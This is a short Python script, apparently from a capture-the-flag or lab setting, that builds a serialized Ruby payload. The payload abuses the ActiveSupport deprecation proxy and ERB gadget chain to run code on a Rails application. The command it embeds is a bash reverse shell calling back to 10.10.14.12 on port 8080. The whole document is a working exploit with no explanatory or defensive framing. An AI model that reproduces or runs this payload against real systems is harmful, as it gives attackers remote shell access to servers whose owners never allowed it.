rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format("10.10.14.12", "8080")
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'
print(chr(len(rev)+7), rev, "\nPAYLOAD: ", payload)